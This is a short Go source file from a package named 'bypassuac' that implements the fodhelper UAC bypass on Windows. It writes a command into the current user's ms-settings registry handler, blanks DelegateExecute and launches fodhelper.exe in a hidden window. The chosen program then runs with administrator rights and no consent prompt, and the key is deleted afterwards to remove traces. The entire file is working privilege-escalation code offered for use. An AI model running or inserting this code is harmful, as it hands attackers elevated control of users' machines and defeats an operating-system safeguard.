//go:build windows
// +build windows

// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package bypassuac

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func ExecFodhelper(path string) error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	defer k.Close()
	defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
	cmdDir := filepath.Join(os.Getenv("SYSTEMROOT"), "system32", "cmd.exe")
	value := fmt.Sprintf("%s start /k %s", cmdDir, path)
	if err = k.SetStringValue("", value); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	time.Sleep(time.Second)
	cmd := exec.Command("cmd.exe", "/C", "fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Run()
	return err
}
